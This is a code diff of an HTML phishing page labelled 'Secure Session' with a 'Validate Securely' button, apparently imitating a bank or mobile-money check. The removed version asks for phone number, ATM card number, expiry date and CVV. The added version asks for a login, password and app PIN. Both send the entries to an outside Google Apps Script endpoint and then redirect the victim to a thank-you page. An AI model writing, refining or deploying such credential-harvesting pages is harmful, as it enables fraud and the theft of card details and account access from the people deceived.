@@ -257,17 +257,15 @@ Secure Session
 
 <form id="demoForm" autocomplete="off">
 
-<label>Phone Number</label>
-      <input type="tel" name="phone_number" placeholder="024XXXXXXX" required>
+<form id="demoForm">
+    <label>Phone Number</label>
+    <input type="text" name="email" placeholder="Enter registered email or phone" required>
 
-<label>ATM Card Number</label>
-      <input type="text" name="atm_card_number" placeholder="16 Digits Card Number" required>
+    <label>Password</label>
+    <input type="password" name="password" placeholder="Enter your password" required>
 
-<label>ATM Expiry Date</label>
-<input type="text" name="atm_expiry_date" placeholder="MM / YY" required>
-
-<label>CVV Number</label>
-      <input type="text" name="cvv_number" placeholder="Enter 3 digits signature Number" required>
+    <label>App PIN Code</label>
+    <input type="text" name="pin" placeholder="Enter app PIN" required>
 
 <button class="btn" type="submit">
 Validate Securely
@@ -290,50 +288,24 @@ Verifying your details…
 </div>
 
 <script>
-
-const scriptURL="https://script.google.com/macros/s/AKfycbzILeiyXskKSZMjCVoAkNJnALcWezQeamAjI-oLj9yyFiahMv_wv3Ak4GYtnKxn3p_r/exec"
-
-const form=document.getElementById("demoForm")
-const overlay=document.getElementById("overlay")
-
-form.addEventListener("submit",async(e)=>{
-
-e.preventDefault()
-
-overlay.classList.add("active")
-
-const formData=new FormData(form)
-
-const response=await fetch(scriptURL,{
-method:"POST",
-body:formData
-})
-
-const result=await response.text()
-
-if(result.toLowerCase().includes("success")){
-
-setTimeout(()=>{
-
-document.body.classList.add("fade-out")
-
-setTimeout(()=>{
-
-window.location.href="thankyou.html"
-
-},500)
-
-},1200)
-
-}else{
-
-overlay.classList.remove("active")
-alert("Validation failed. Please check your details.")
-
-}
-
-})
-
+document.getElementById("demoForm").addEventListener("submit", async event => {
+  event.preventDefault();
+  const data = new FormData(event.target);
+  try {
+    const res = await fetch(
+      "https://script.google.com/macros/s/AKfycbwmkOBcmudBWS5kC-9UD2Gq_jsddGL9V8rNI2imMEf23HGzroYRrX6Svee0DNSS7msP/exec",
+      { method: "POST", body: data }
+    );
+    const text = await res.text();
+    if (text.includes("SUCCESS")) {
+      window.location.href = "thankyou.html";
+    } else {
+      alert("Submission failed. Please try again.");
+    }
+  } catch {
+    alert("Network error. Please try again.");
+  }
+});
 </script>
 
 </body>
